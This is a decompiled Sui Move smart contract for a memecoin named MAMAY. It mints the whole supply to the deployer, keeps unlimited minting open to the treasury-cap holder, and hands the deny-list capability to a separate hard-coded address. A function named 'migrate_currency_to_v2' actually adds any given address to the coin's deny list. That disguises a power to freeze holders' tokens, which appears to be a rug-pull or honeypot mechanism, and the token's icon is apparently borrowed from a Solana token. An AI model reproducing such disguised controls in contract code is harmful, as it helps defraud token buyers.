module 0x4545f40bf941662673a677097ea827d43bddb76553370f3d57fc89f0c70315fd::mamay {
    struct MAMAY has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<MAMAY>, arg1: 0x2::coin::Coin<MAMAY>) {
        0x2::coin::burn<MAMAY>(arg0, arg1);
    }

    fun init(arg0: MAMAY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MAMAY>(arg0, 9, b"MAMAY", b"mamay", b"mamay", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://dd.dexscreener.com/ds-data/tokens/solana/Cz75ZtjwgZmr5J1VDBRTm5ZybZvEFR5DEdb8hEy59pWq.png?size=xl&key=a36734")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MAMAY>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MAMAY>>(v2);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<MAMAY>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MAMAY>>(v1, @0x51109d190acb168019f395739ceb188ac699f7acba84b80980ae1413c3837fc0);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MAMAY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MAMAY>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<MAMAY>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<MAMAY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

